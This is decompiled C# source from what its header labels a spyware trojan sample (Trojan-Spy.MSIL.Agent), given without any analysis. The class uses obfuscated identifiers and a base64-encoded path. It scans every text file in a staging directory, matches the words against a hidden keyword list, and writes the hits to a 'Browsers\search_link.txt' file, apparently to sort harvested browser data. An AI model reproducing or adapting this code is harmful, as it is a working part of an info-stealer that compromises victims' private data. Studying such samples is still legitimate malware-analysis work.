// Decompiled with JetBrains decompiler
// Type: zezezebgddfdfdf.HygoLange
// Assembly: Xobntom2, Version=1.0.0.422, Culture=neutral, PublicKeyToken=null
// MVID: 7E933326-C6DC-4B1B-B81C-CFA3C6FCABF5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.MSIL.Agent.gen-bbc8ac47d3051fbab328d4a8a4c1c8819707ac045ab6ac94b1997dac59be2ece.exe

using AlphaCentavr;
using AlphaCentavr.Properties;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace zezezebgddfdfdf
{
  internal class HygoLange
  {
    public static string palasit()
    {
      try
      {
        Encoding utF8 = Encoding.UTF8;
        List<string> list = ((IEnumerable<string>) Resources.upche.Split()).Select<string, string>((Func<string, string>) (w => w.Trim())).Where<string>((Func<string, bool>) (w => w != "")).Select<string, string>((Func<string, string>) (w => w.ToLower())).ToList<string>();
        FileInfo[] files = new DirectoryInfo(glantrah.ekranirovan).GetFiles("*.txt", SearchOption.AllDirectories);
        List<string> stringList = new List<string>();
        foreach (FileInfo fileInfo in files)
          stringList.AddRange((IEnumerable<string>) File.ReadAllLines(fileInfo.FullName, utF8));
        HashSet<string> stringSet1 = new HashSet<string>();
        foreach (string str1 in stringList)
        {
          foreach (string str2 in ((IEnumerable<string>) str1.Split()).Select<string, string>((Func<string, string>) (w => w.Trim())).Where<string>((Func<string, bool>) (w => w != "")).Select<string, string>((Func<string, string>) (w => w.ToLower())).ToList<string>())
          {
            if (!stringSet1.Contains(str2))
              stringSet1.Add(str2);
          }
        }
        HashSet<string> stringSet2 = new HashSet<string>();
        foreach (string str3 in list)
        {
          foreach (string str4 in stringSet1)
          {
            if (str4.Contains(str3) && !stringSet2.Contains(str3))
              stringSet2.Add(str3);
          }
        }
        File.WriteAllLines(glantrah.ekranirovan + HygoLange.alonso("XFxCcm93c2Vyc1xcc2VhcmNoX2xpbmsudHh0"), (IEnumerable<string>) stringSet2, Encoding.Default);
        return string.Join(", ", (IEnumerable<string>) stringSet2);
      }
      catch (Exception ex)
      {
        return "ERRee";
      }
    }

    private static string alonso(string hryshovkasisssa) => Encoding.ASCII.GetString(Convert.FromBase64String(hryshovkasisssa));
  }
}
